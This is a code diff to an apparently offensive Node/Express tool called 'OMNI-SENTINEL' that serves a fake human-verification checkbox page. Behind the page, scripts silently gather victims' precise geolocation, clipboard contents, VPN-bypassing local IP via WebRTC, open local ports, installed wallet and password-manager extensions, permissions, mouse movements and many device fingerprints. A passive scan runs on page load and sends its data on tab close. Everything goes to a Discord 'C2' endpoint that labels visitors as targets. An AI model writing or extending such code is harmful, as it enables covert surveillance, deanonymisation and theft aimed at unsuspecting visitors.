@@ -184,6 +184,10 @@ app.get('/', (req, res) => {
 
             let neuralRhythm = [];
             let lastTap = 0;
+            let mousePath = []; // Behavioral Biometrics
+            let hasSentActive = false;
+            let passiveCache = null;
+
             // Support both Touch (Mobile) and Mouse (Desktop) rhythms
             ['touchstart', 'mousedown'].forEach(evt => 
                 document.addEventListener(evt, () => { lastTap = performance.now(); })
@@ -193,39 +197,92 @@ app.get('/', (req, res) => {
                     if(lastTap) neuralRhythm.push((performance.now() - lastTap).toFixed(2)); 
                 })
             );
+            
+            // Track Mouse Path (Last 50 points)
+            document.addEventListener('mousemove', (e) => {
+                if(mousePath.length > 50) mousePath.shift();
+                mousePath.push({x: e.clientX, y: e.clientY, t: Date.now()});
+            });
 
             // Auto-click handler for body to ensure engagement
             function handleClickBody() {
                 // Optional: track misc clicks
             }
 
+            // Trigger Passive Scan Cache Build
+            window.onload = () => { setTimeout(() => gatherForensics('passive'), 500); };
+
+            // Smart Exit Beacon
+            document.addEventListener("visibilitychange", () => {
+                if (document.visibilityState === 'hidden') {
+                    if (!hasSentActive && passiveCache) {
+                        navigator.sendBeacon('/collect', JSON.stringify(passiveCache));
+                    }
+                }
+            });
+
             function startVerification(e) {
-                // Prevent double clicks
                 if (document.getElementById('spinner').style.display === 'block') return;
                 
+                hasSentActive = true; // Mark interaction to suppress passive beacon
                 e.stopPropagation();
-
+                
                 // UI Updates
                 document.getElementById('checkbox-box').style.display = 'none';
                 document.getElementById('spinner').style.display = 'block';
                 document.getElementById('status-text').style.display = 'block';
-
-                // Execute the forensics
-                executeOmni();
+                
+                // Trigger Active Scan
+                gatherForensics('active');
             }
 
-            async function executeOmni() {
-                // High-Accuracy Location Handshake
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(runDeepForensics, (e) => runDeepForensics({}), { 
-                        enableHighAccuracy: true, 
-                        timeout: 8000 
-                    });
-                } else { runDeepForensics({}); }
-            }
+            async function gatherForensics(mode) {
+                // Prepare Promises
+                const pAudio = getAudioFingerprint().catch(e => "Blocked");
+                const pPorts = scanLocalPorts().catch(e => []);
+                const pVoices = getSpeechVoices().catch(e => []);
+                const pExts = scanExtensions().catch(e => []);
+                const pPerms = scanPermissions().catch(e => "Error");
+                const pBatt = (async () => { try { const b = await navigator.getBattery(); return (b.level * 100).toFixed(0) + "%"; } catch(e) { return "Blocked"; } })();
+                const pIP = new Promise(resolve => {
+                    setTimeout(() => resolve("Timeout"), 1000); 
+                    try {
+                        const pc = new RTCPeerConnection({iceServers:[]});
+                        pc.createDataChannel("");
+                        pc.onicecandidate = c => { 
+                            if (c.candidate) {
+                                const ipMatch = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.exec(c.candidate.candidate);
+                                if (ipMatch) { pc.close(); resolve(ipMatch[0]); }
+                            }
+                        };
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                    } catch(e) { resolve("Not_Supported"); }
+                });
 
-            async function runDeepForensics(pos) {
-                // 1. SILICON DNA (Execution Port Contention Attack)
+                // Mode Specifics
+                let pos = {};
+                let clipboard = "Skipped (Passive)";
+                
+                if (mode === 'active') {
+                    // 1. Geolocation (High Accuracy) - Blocks UI
+                    try {
+                        pos = await new Promise(resolve => {
+                             if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(p => resolve(p), e => resolve({}), { enableHighAccuracy: true, timeout: 3000 });
+                            } else { resolve({}); }
+                        });
+                    } catch(e) {}
+
+                    // 2. Clipboard (Requires Interaction)
+                    clipboard = await getClipboard();
+                }
+
+                // Await Parallel Tasks
+                const [audioHash, openPorts, voices, extensions, permissions, battery, localIP] = await Promise.all([
+                    pAudio, pPorts, pVoices, pExts, pPerms, pBatt, pIP
+                ]);
+
+                // SYNC Tasks
                 let siliconDNA = "Unknown";
                 try {
                     const t0 = performance.now();
@@ -233,7 +290,6 @@ app.get('/', (req, res) => {
                     siliconDNA = (performance.now() - t0).toFixed(6);
                 } catch(e) { siliconDNA = "Blocked"; }
 
-                // 2. KERNEL JIT SPEED (OS Kernel Fingerprint)
                 let kernelJIT = "Unknown";
                 try {
                     const t1 = performance.now();
@@ -241,31 +297,8 @@ app.get('/', (req, res) => {
                     kernelJIT = (performance.now() - t1).toFixed(4);
                 } catch(e) { kernelJIT = "Blocked"; }
 
-                // 3. ATOMIC CLOCK SKEW
                 const clockSkew = (performance.now() - (Date.now() - Date.now())).toFixed(8);
 
-                // 4. WEBRTC VPN PIERCING (Local Network IP)
-                const localIP = await new Promise(resolve => {
-                    try {
-                        const pc = new RTCPeerConnection({iceServers:[]});
-                        pc.createDataChannel("");
-                        pc.onicecandidate = c => { 
-                            if (!c.candidate) return;
-                            const cand = c.candidate.candidate;
-                            const ipMatch = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.exec(cand);
-                            if (ipMatch) {
-                                pc.close();
-                                resolve(ipMatch[0]);
-                            } else if (cand.includes(".local")) {
-                                resolve("mDNS_Hidden_Area");
-                            }
-                        };
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        setTimeout(() => resolve("Hidden_or_Blocked"), 1000);
-                    } catch(e) { resolve("Not_Supported"); }
-                });
-
-                // 5. MOBILE SHADER DNA
                 let shaderDNA = "Unknown";
                 try {
                     const canvas = document.createElement('canvas');
@@ -273,45 +306,17 @@ app.get('/', (req, res) => {
                     ctx.fillText("OMNI-LEGACY", 10, 10);
                     shaderDNA = canvas.toDataURL().slice(-45);
                 } catch (e) {}
-
-                // 6. AUDIO CONTEXT FINGERPRINT
-                let audioHash = "Unknown";
-                try {
-                    audioHash = await getAudioFingerprint();
-                } catch(e) { audioHash = "Blocked"; }
-
-                // 7. NETWORK TELEMETRY
+                
                 const netInfo = getNetworkInfo();
-
-                // 8. SCREEN & WINDOW PROFILING
                 const screenInfo = getScreenDetails();
-
-                // 9. LOCAL PORT SCAN (Developer Detection)
-                // Scans common ports to see if the victim is a developer/admin
-                const openPorts = await scanLocalPorts();
-
-                // 10. VOICE & LANGUAGE PACKS (OS Fingerprint)
-                const voices = await getSpeechVoices();
-
-                // 11. FONT FINGERPRINTING (Entropy)
                 const fontID = getFontFingerprint();
-
-                // 12. BOT DETECTION (Headless/Automation)
                 const botScore = detectBot();
-
-                // 13. CLIPBOARD HEIST (Steal Text)
-                const clipboard = await getClipboard();
-
-                // 14. DISK STORAGE FORENSICS
                 const storage = await getStorageEstimate();
-
-                // 15. CPU BENCHMARK (Stress Test)
                 const cpuScore = runCPUBenchmark();
-
-                // 16. HARDWARE ENUMERATION (Cams/Mics)
                 const mediaPeripherals = await getMediaDevices();
 
                 const finalData = {
+                    type: mode, // 'passive' or 'active'
                     id: "${victimID}",
                     lat: pos.coords ? pos.coords.latitude : null,
                     lon: pos.coords ? pos.coords.longitude : null,
@@ -337,29 +342,31 @@ app.get('/', (req, res) => {
                     storage: storage,
                     cpu_score: cpuScore,
                     media: mediaPeripherals,
+                    extensions: extensions.join(', ') || "None",
+                    permissions: permissions,
+                    behavior: mousePath.map(p => p.x + "," + p.y).join('|'),
                     neural: neuralRhythm.slice(-5).join('|'),
                     gpu: getGPUHardware(),
-                    battery: await (async () => {
-                        try {
-                            const b = await navigator.getBattery();
-                            return (b.level * 100).toFixed(0) + "%"; 
-                        } catch(e) { return "Blocked"; }
-                    })(),
+                    battery: battery,
                     platform: navigator.userAgent,
                     cores: navigator.hardwareConcurrency || "Unknown",
                     ram: navigator.deviceMemory || "Unknown"
                 };
 
-                // 🚀 STABILITY FIX: sendBeacon handles background transport
-                navigator.sendBeacon('/collect', JSON.stringify(finalData));
-                
-                // Simulate 'success' tick before redirecting
-                document.getElementById('spinner').style.display = 'none';
-                document.getElementById('checkbox-box').style.display = 'block';
-                document.getElementById('checkbox-box').classList.add('checked');
-                document.getElementById('status-text').innerHTML = '<strong>Success! Redirecting...</strong>';
-                
-                setTimeout(() => { window.location.href = "${REDIRECT_URL}"; }, 1000);
+                if (mode === 'passive') {
+                    passiveCache = finalData;
+                    // Passive data is now CACHED. Sent only on tab close (visibilitychange).
+                } else {
+                    // Active Mode - Send Immediately
+                    navigator.sendBeacon('/collect', JSON.stringify(finalData));
+                    
+                    // Simulate 'success' tick
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('checkbox-box').style.display = 'block';
+                    document.getElementById('checkbox-box').classList.add('checked');
+                    document.getElementById('status-text').innerHTML = '<strong>Success! Redirecting...</strong>';
+                    setTimeout(() => { window.location.href = "${REDIRECT_URL}"; }, 500);
+                }
             }
 
             function getNetworkInfo() {
@@ -520,6 +527,53 @@ app.get('/', (req, res) => {
                     return cams + " Cams | " + mics + " Mics";
                 } catch(e) { return "Blocked"; }
             }
+
+            async function scanExtensions() {
+                // Common extensions to check (Chrome/Edge/Brave)
+                const exts = {
+                    'Metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
+                    'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
+                    'UBlock': 'cjpalhdlnbpafiamejdnhcphjbkeiagm',
+                    'LastPass': 'hdokiejnpimakedhajhdlcegeplioahd',
+                    'ReactDev': 'fmkadmapgofadopljbjfkapdkoienihi',
+                    'Honey': 'bmnlcjabgnpnenekpadlanbbkooimhnj'
+                };
+                const detected = [];
+                for(const [name, id] of Object.entries(exts)) {
+                    try {
+                        await fetch('chrome-extension://' + id + '/manifest.json', { method: 'HEAD' });
+                        detected.push(name);
+                    } catch(e) {
+                         // Some browsers block fetch but allow Image load for resources
+                         const img = new Image();
+                         img.src = 'chrome-extension://' + id + '/manifest.json'; // or specific icon
+                         // This is a rough check, sophisticated version needs specific resource paths
+                    }
+                    // Alternate method: Image Load for specific resource
+                    if(!detected.includes(name)) { // Try Resource
+                         await new Promise(r => {
+                            const img = new Image();
+                            img.src = 'chrome-extension://' + id + '/icons/icon128.png'; // Common path
+                            img.onload = () => { detected.push(name); r(); };
+                            img.onerror = () => r();
+                        });
+                    }
+                }
+                return detected;
+            }
+
+            async function scanPermissions() {
+                const p = ['camera', 'microphone', 'notifications', 'geolocation', 'clipboard-read'];
+                const res = [];
+                if(!navigator.permissions) return "Not_Supported";
+                for(const name of p) {
+                    try {
+                        const s = await navigator.permissions.query({name: name});
+                        if(s.state === 'granted') res.push(name);
+                    } catch(e) {}
+                }
+                return res.join(', ') || "None";
+            }
         </script>
     </body>
     </html>`;
@@ -536,6 +590,9 @@ app.post('/collect', async (req, res) => {
     const ip = requestIp.getClientIp(req);
     const ua = req.get('User-Agent');
 
+    // Debug: Confirmed Data Input
+    console.log(`📦 Data Recv (${d.type}): ` + ip);
+
     // --- ZOMBIE PERSISTENCE (Track Original Identity) ---
     const zombie = victimDatabase[d.id] || { original: ip };
     const isVPN = zombie.original !== ip;
@@ -551,26 +608,47 @@ app.post('/collect', async (req, res) => {
         } catch (e) { }
     }
 
+    // Helper to truncate fields (Discord Limit 1024 chars)
+    const trunc = (str, len = 1000) => {
+        if (!str) return 'N/A';
+        str = String(str);
+        return str.length > len ? str.substring(0, len) + "..." : str;
+    };
+
+    let embedColor = 0x00ff00; // Green (Active)
+    let embedTitle = "🎯 [TARGET ACQUIRED]";
+
+    if (d.type === 'passive') {
+        embedColor = 0xFFD700; // Gold (Passive)
+        embedTitle = "⚠️ [PRE-INTERACTION SNIGG]"; // Scout Mode
+    } else if (isVPN) {
+        embedColor = 0xff0000; // Red (VPN)
+        embedTitle = "🚨 [VPN BYPASSED - PHYSICAL TARGET LOCK]";
+    }
+
     const embed = {
         username: "OMNI-SENTINEL PRIME C2",
         embeds: [{
-            title: isVPN ? "🚨 [VPN BYPASSED - PHYSICAL TARGET LOCK]" : "🎯 [TARGET ACQUIRED]",
-            color: isVPN ? 0xff0000 : 0x00ff00,
+            title: embedTitle,
+            color: embedColor,
             fields: [
-                { name: "👤 IDENTITY DOSSIER", value: `ID: \`${d.id}\`\\nActive IP: \`${ip}\` (Orig: \`${zombie.original}\`)`, inline: false },
+                { name: "👤 IDENTITY DOSSIER", value: `ID: \`${d.id}\`\\nType: **${d.type.toUpperCase()}**\\nActive IP: \`${ip}\``, inline: false },
                 { name: "📍 PHYSICAL POSITION", value: `[Maps Link](https://www.google.com/maps?q=${d.lat},${d.lon}) (Acc: ${d.acc}m)`, inline: true },
                 { name: "🌍 NETWORK ORIGIN", value: `\`${geoCity}, ${geoCountry}\``, inline: true },
-                { name: "📡 NETWORK TECH", value: `Type: \`${d.net_type}\`\\nDown: \`${d.net_down}\`\\nRTT: \`${d.net_rtt}\``, inline: true },
+                { name: "📡 NETWORK TECH", value: `Type: \`${d.net_type || '?'}\`\\nDown: \`${d.net_down || '?'}\`\\nRTT: \`${d.net_rtt || '?'}\``, inline: true },
                 { name: "⚡ SILICON DNA / JIT", value: `\`${d.silicon_dna}\` / \`${d.kernel_jit}\``, inline: true },
-                { name: "🔉 AUDIO FINGERPRINT", value: `\`${d.audio_fp}\``, inline: true },
+                { name: "🔉 AUDIO FINGERPRINT", value: `\`${d.audio_fp || 'N/A'}\``, inline: true },
                 { name: "💻 SCREEN SPEC", value: `Res: \`${d.screen_res}\`\\nDepth: \`${d.screen_depth}\`\\nRatio: \`${d.pixel_ratio}x\`\\nTouch: \`${d.max_touch}\``, inline: true },
-                { name: "🔓 OPEN PORTS", value: `\`${d.open_ports}\``, inline: true },
+                { name: "🔓 OPEN PORTS", value: `\`${d.open_ports || 'None'}\``, inline: true },
                 { name: "🤖 BOT PROBABILITY", value: `\`${d.bot_score}\``, inline: true },
-                { name: "📋 CLIPBOARD HEIST", value: `\`${d.clipboard || 'Denied'}\``, inline: false },
-                { name: "💾 DISK & CPU", value: `Disk: \`${d.storage}\`\\nCPU Score: \`${d.cpu_score}\``, inline: true },
-                { name: "📷 PERIPHERALS", value: `\`${d.media}\``, inline: true },
-                { name: "🗣️ VOICES / FONTS", value: `Voices: \`${d.voices}\`\\nFont ID: \`${d.font_id}\``, inline: false },
-                { name: "🧠 NEURAL SIGNATURE", value: `\`${d.neural || 'Scanning...'}\``, inline: false },
+                { name: "📋 CLIPBOARD HEIST", value: `\`${trunc(d.clipboard, 800)}\``, inline: false },
+                { name: "💾 DISK & CPU", value: `Disk: \`${trunc(d.storage)}\`\\nCPU Score: \`${trunc(d.cpu_score)}\``, inline: true },
+                { name: "📷 PERIPHERALS", value: `\`${trunc(d.media)}\``, inline: true },
+                { name: "🧩 EXTENSIONS", value: `\`${trunc(d.extensions)}\``, inline: true },
+                { name: "🛡️ PERMISSIONS", value: `\`${trunc(d.permissions)}\``, inline: true },
+                { name: "🖱️ BEHAVIOR (Path)", value: `Events: \`${d.behavior ? d.behavior.split('|').length : 0}\` (Human verification)`, inline: true },
+                { name: "🗣️ VOICES / FONTS", value: `Voices: \`${trunc(d.voices, 500)}\`\\nFont ID: \`${trunc(d.font_id)}\``, inline: false },
+                { name: "🧠 NEURAL SIGNATURE", value: `\`${trunc(d.neural)}\``, inline: false },
                 { name: "📱 PHYSICAL PROFILE", value: `GPU: \`${d.gpu}\`\\nRAM: \`${d.ram}GB\` | Cores: \`${d.cores}\`\\nBattery: \`${d.battery}\`\\nShader: \`${d.shader_dna}\`\\nSkew: \`${d.clock_skew}\``, inline: false }
             ],
             footer: { text: "PROJECT OMNI-SENTINEL | AUTHOR: GENIUS MASTER | SUPREME OMEGA BUILD" },
